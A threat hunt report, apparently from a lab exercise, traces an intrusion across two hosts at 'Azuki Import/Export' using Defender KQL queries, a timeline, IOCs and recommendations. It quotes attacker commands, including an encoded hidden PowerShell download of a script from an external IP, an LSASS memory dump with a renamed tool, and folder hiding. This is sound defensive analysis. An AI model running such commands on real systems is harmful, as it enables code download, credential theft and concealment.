# # Threat Hunt Report-Cargo Hold

## Threat Hunt Report – Cargo Hold

---

**Azuki Import/Export**

**Report Type:** Threat Hunt / Incident Expansion

**Analyst:** Andre Poyser

**Incident Name:** Cargo Hold

**Primary Data Source:** Microsoft Defender for Endpoint (MDE)

**Initial Compromise Date:** 2025-11-19

**Secondary Activity Detected:** 2025-11-22

**Report Date:** 2025-11-26

---

## Executive Summary

Following a confirmed workstation compromise on **November 19, 2025**, threat hunting efforts identified **renewed attacker activity approximately 72 hours later**. The adversary re-entered the environment using previously compromised credentials and conducted **lateral movement to a file server**, where extensive reconnaissance, data staging, credential harvesting, and exfiltration occurred.

The attacker leveraged **PowerShell-based tradecraft**, hid staging directories, renamed credential dumping artifacts, and exfiltrated sensitive data to an external file-sharing service. Evidence strongly indicates a **hands-on-keyboard intrusion** with deliberate attempts to evade detection and erase forensic traces.

This incident represents a **high-impact breach** with confirmed credential exposure, data theft, persistence mechanisms, and log tampering.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Summary of Findings

- Attacker returned **72 hours post-compromise** using valid credentials
- Lateral movement from **azuki-sl → azuki-fileserver01**
- Extensive enumeration of users, privileges, and network shares
- PowerShell scripts staged and hidden in `C:\Windows\Logs\CBS`
- Credential dumping via renamed executable (`pd.exe`)
- Sensitive data staged, compressed, and exfiltrated externally
- Persistence achieved via registry Run key
- Evidence of **anti-forensics** through log deletion

## 👤 Attacker Profile

| Attribute | Details |
| --- | --- |
| Initial Access IP | `159.26.106.98` |
| C2 / Exfil Services | `file.io`, external web hosts |
| Tools Observed | PowerShell, certutil, curl, tar, attrib |
| Tactics | Living-off-the-Land (LOLBins), credential abuse |
| Operator Type | Interactive / Manual |

---

## Compromised Assets

### Accounts

- **kenji.sato** – Initial compromise
- **fileadmin** – Lateral movement & data theft

### Systems

- **azuki-sl** – Initial foothold
- **azuki-fileserver01** – Data staging & exfiltration

 ## MITRE ATT&CK Mapping

| Tactic | Technique ID | Description |
| --- | --- | --- |
| Initial Access | T1078 | Valid Accounts |
| Lateral Movement | T1021.001 | Remote Desktop Protocol |
| Execution | T1059.001 | PowerShell |
| Defense Evasion | T1564.001 | Hidden Files and Directories |
| Credential Access | T1003.001 | LSASS Memory Dump |
| Discovery | T1087, T1135 | Account & Network Share Discovery |
| Collection | T1560 | Archive Collected Data |
| Exfiltration | T1567.002 | Exfiltration to Web Service |
| Persistence | T1547.001 | Registry Run Keys |
| Impact | T1070.004 | File Deletion (Anti-Forensics) |

---

## Investigation Timeline (UTC)

| Time | Event |
| --- | --- |
| 2025-11-22 00:40 | User & privilege enumeration (`whoami`, `net user`) |
| 2025-11-22 00:42 | Network share discovery (`net view \\10.1.0.188`) |
| 2025-11-22 00:55 | Staging directory hidden (`attrib +h +s`) |
| 2025-11-22 01:03 | Suspicious PowerShell script (`ex.ps1`) |
| 2025-11-22 01:07 | Credential file created (`IT-Admin-Passwords.csv`) |
| 2025-11-22 01:30 | Data compressed (`tar.exe`) |
| 2025-11-22 01:59 | Data exfiltrated to `file.io` |
| 2025-11-22 02:10 | Persistence via registry Run key |
| 2025-11-22 02:26 | PowerShell history deleted |

---

## Impact Assessment

### Actual Impact

- Credential compromise (administrator-level)
- Theft of sensitive administrative data
- Unauthorized access to file server
- Persistence mechanisms established
- Log deletion hindered visibility

### Risk Level

**High**

Justification:

- Confirmed data exfiltration
- Credential dumping
- Multi-host compromise
- Active persistence and anti-forensics

---

## Recommendations

### Immediate Actions

1. Disable and reset passwords for **kenji.sato** and **fileadmin**
2. Isolate **azuki-fileserver01** and **azuki-sl**
3. Remove persistence registry keys
4. Block outbound access to file-sharing services
5. Preserve forensic images for legal review

### Long-Term Hardening

1. Enforce MFA for all privileged accounts
2. Restrict PowerShell (Constrained Language Mode)
3. Enable Attack Surface Reduction (ASR) rules
4. Monitor for hidden directories and registry autoruns
5. Implement SIEM alerts for:
    - Encoded PowerShell
    - `attrib +h`
    - Credential dumping artifacts
    - External upload utilities (`curl`, `certutil`)

## Appendix

### A. Key IOCs

| Type | Value |
| --- | --- |
| IP | 159.26.106.98 |
| File | `ex.ps1`, `svchost.ps1`, `credentials.tar.gz` |
| Tool | `pd.exe` (renamed credential dumper) |
| Path | `C:\Windows\Logs\CBS` |
| Service | `file.io` |

---

### B. Evidence Sources

- Microsoft Defender for Endpoint
- DeviceLogonEvents
- DeviceProcessEvents
- DeviceFileEvents
- DeviceNetworkEvents
- DeviceRegistryEvents
- 
**Evidence - KQL Queries & Screenshots**
**Query 1 - Initial Access**:
  
Check for remote logons (Credential reuse) / Lateral movement:
  ```
  let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceLogonEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where AccountName == "kenji.sato"
| where LogonType in ("RemoteInteractive", "Network")
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType
| order by Timestamp desc
```
Timestamp **2025-11-22T01:58:55.7325167Z** device “**azuki-sl**”  was accessed remotely from IP **159.26.106.98**
<img width="820" height="738" alt="image" src="https://github.com/user-attachments/assets/6200313b-db6e-4f3e-b31a-8ee5f9cc5995" />
**Query 2 - Lateral Movement**
Checked for lateral movement:
```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where ProcessCommandLine contains "mstsc.exe"
//| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```
<img width="820" height="577" alt="image" src="https://github.com/user-attachments/assets/64690d60-984d-42d6-86eb-2fb5e6d99fa3" />

**Query 3** - Added more information to get more results

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where FileName has_any ("mstsc.exe", "powershell", "psexec", "cmd", "winrm")
| where DeviceName contains "azuki"
| order by Timestamp asc

```
Found activities from “azuki-fileserver01” and “azuki-sl”.
<img width="822" height="739" alt="image" src="https://github.com/user-attachments/assets/a09607ed-106a-4377-8799-4de709c823e2" />
I refined the query to include the AccountName “admin” since the name of the server suggests it would be used by an administrator.
<img width="1065" height="708" alt="image" src="https://github.com/user-attachments/assets/85c2d107-a98a-4717-9887-e5dd5585d59f" />
Timeline **2025-11-22T01:03:55.6767092Z**: Suspicious **powesrhell process** was created. The location for the path is also suspicious “**C:\Windows\Logs\CBS\ex.ps1**”
Command:
```
"powershell.exe" -ExecutionPolicy Bypass -File C:\Windows\Logs\CBS\ex.ps1
```
```
InitiatingProcessRemoteSessionDeviceName: AZUKI-SL
InitiatingProcessRemoteSessionIP: 10.1.0.204
```
Confirming the script was executed remotely from azuki-sl
<img width="373" height="228" alt="image" src="https://github.com/user-attachments/assets/da8ea1f6-201a-4d98-9257-179ddfd991ba" /> <img width="316" height="396" alt="image" src="https://github.com/user-attachments/assets/19ad2ed9-9a18-4310-aa3c-ec3f11c82e21" />

Note: Multi-stage powershell pivoting:
```
powershell.exe (PID 2932) -> powershell.exe (PID 6904)
```
Timestamp **2025-11-22T02:04:43.7036166Z**: A **hidden powershell command** was executed which is partially encrypted:
```
"powershell.exe" -NoP -NonI -W Hidden -Exec Bypass -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwA3ADgALgAxADQAMQAuADEAOQA2AC4ANgA6ADgAMAA4ADAALwBTAHYAYwBoAG8AcwB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAdgBjAGgAbwBzAHQALgBwAHMAMQAiAA==

```
<img width="820" height="510" alt="image" src="https://github.com/user-attachments/assets/13ee43bf-2b3c-4fa7-95c7-f2a1e4295e5c" />

**Query 4**
Powershell commands

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where FileName has_any ("mstsc.exe", "powershell", "psexec", "cmd", "winrm")
| where DeviceName contains "azuki"
| where AccountName contains "admin"
| where ProcessCommandLine has_any ("smb", "net", "share", "view", "client")
| order by Timestamp asc

```
Timeline **2025-11-22T02:11:13.892171Z** PowerShell command executed:

```
"powershell.exe" -NoP -W Hidden -File C:\Windows\System32\svchost.ps1

```
<img width="854" height="516" alt="image" src="https://github.com/user-attachments/assets/74f3b089-7914-49d6-935b-fa54a9c495ae" />

**Query 5**
Fine-tuned the query to check for Enumeration commands:
```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-fileserver01" 
| where ProcessCommandLine has_any ("smb", "net", "share", "view", "client", "sharing")
| order by Timestamp asc

```
Timestamp **2025-11-22T00:40:33.3168699Z**: First enumeration from the “**azuki-fileserver01**” machine by user “**fileadmin**”. The commands were executed using the net.exe command “**net.exe ” user**, followed by other commands
<img width="1856" height="253" alt="image" src="https://github.com/user-attachments/assets/18debad4-f396-4e47-b9ee-1fa5d9fb5df4" />
**Query 6**
Checked for user privilege enumeration:

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-fileserver01" 
| where ProcessCommandLine has_any ("whoami", "GetUserNameA", "grep", "priv")
| order by Timestamp asc

```
Timestamp **2025-11-22T00:40:09.3456568Z** “**whoami**” command was initiated on **fileserver01** remotely from device **azuki-sl** and user **fileadmin**.

<img width="750" height="635" alt="image" src="https://github.com/user-attachments/assets/dd9b04c0-58ec-4f5b-97a6-bf8a72876375" />
<img width="825" height="277" alt="image" src="https://github.com/user-attachments/assets/83ed861e-d713-47a1-ac7c-648c40878e68" />

**Query 7** - Network Enumeration
```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-fileserver01" 
| where ProcessCommandLine has_any ("ipconfig", "show ip", "route", "network")
| order by Timestamp asc

```
Timestamp **2025-11-22T00:42:46.3655894Z**: " **ipconfig / all** " command executed on **fileserver01 remotely** from **azuki-sl** and user **fileadmin**.
<img width="750" height="672" alt="image" src="https://github.com/user-attachments/assets/0eaade7c-b652-46c4-a8b3-41b59d12c0af" />

**Query 8** - Attacker Staging Directories:
```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where ProcessCommandLine matches regex @"attrib\s+\+h|\+s|\+r"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp desc

```
Timestamp **2025-11-22T00:55:43.9986049Z**: command to hide staging directory was executed on **azuki-fileserver01**
Command:

```
"attrib.exe" +h +s C:\Windows\Logs\CBS
```
This attempts to hide the path: "**C:\Windows\Logs\CBS**"
<img width="750" height="652" alt="image" src="https://github.com/user-attachments/assets/f609ffb2-ec49-4685-ba6a-a63cdaeeefd6" />

**Query 9** - File Downloads

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where AccountName contains "fileadmin"
| where DeviceName contains "azuki"
| where ProcessCommandLine has_any ("get", "curl", "Invoke-Webrequest", "copy", "certutil")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessRemoteSessionIP, FolderPath
| order by Timestamp desc

```
Timestamp **2025-11-22T00:56:47.4100711Z**: “**certutil**” command was executed on **azuki-fileserver01** by account name **fileadmin** to download a file ending “**ps1**” which is a **powershell extension**.
<img width="1119" height="704" alt="image" src="https://github.com/user-attachments/assets/2ac04d47-c9ef-4af3-b8c0-80aa2cdceb08" />

**Query 10** - Check for Exfiltration of Credentials

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceFileEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where ActionType == "FileCreated"
| where FileName has_any ("credentials", "key", "keychains", "passwords", "dump", "dmp", "sensitive", "data")
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, DeviceName, FileName, ActionType,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc

```
Timestamp **2025-11-22T01:07:53.6746323Z**: “**IT-Admin-Passwords.csv**” file was created, presumably to store harvested credentials.
<img width="1126" height="685" alt="image" src="https://github.com/user-attachments/assets/996fb6d7-2353-454e-a073-e6b3e6905c4b" />

**Query 11** - Check for Command Execution to stage data:

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName contains "azuki-fileserver01"
| where AccountName contains "fileadmin"
| where ProcessRemoteSessionDeviceName contains "azuki-sl"
| where ProcessCommandLine has_any ("xcopy", "7z", @"c:\programdata", @"AppData\Local\Temp")
| order by Timestamp desc 

```
Timestamp **2025-11-22T01:07:53.6430063Z**: A command was executed to stage data from  a network share.
<img width="1211" height="746" alt="image" src="https://github.com/user-attachments/assets/8c9f254e-85df-4c0e-96d5-f3246bff5266" />

**Query 12** - Check for compressed files:

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceFileEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName contains "azuki-fileserver01"
| where FileName matches regex @"\.(zip|7z|rar|cab|tar|gz|tgz)$"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc

```
Timestamp **2025-11-22T01:30:10.1421235Z**: "**tar.exe**" command was used to compress staged data.

<img width="852" height="256" alt="image" src="https://github.com/user-attachments/assets/fe74ee3c-bb52-44b8-bf11-30c452245657" />

**Query 13** - Credential Dumping Executables

```
let PostIncidentStart = datetime(2025-11-20T19:10:42Z);
let PostIncidentEnd   = datetime(2025-11-23T19:10:42Z);
DeviceFileEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where ActionType == "FileCreated"
| where FileName has_any ("credentials", "key", "keychains", "passwords", "dump", "dmp", "sensitive", "data")
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, DeviceName, FileName, ActionType,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc

```
Timestamp **2025-11-22T02:24:47.6967458Z**: credential dumping executable “**lsass.dmp**” was renamed to “**pd.exe**”
<img width="1165" height="387" alt="image" src="https://github.com/user-attachments/assets/27b05bbd-48e7-4619-9e7c-9b40af2cbfe7" />

The file was renamed in addition to the command to dump process memnory for credential extraction.
Command used:
```
"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp

```




**Report Prepared By:**

**Andre Poyser**

Security Analyst / Threat Hunter 
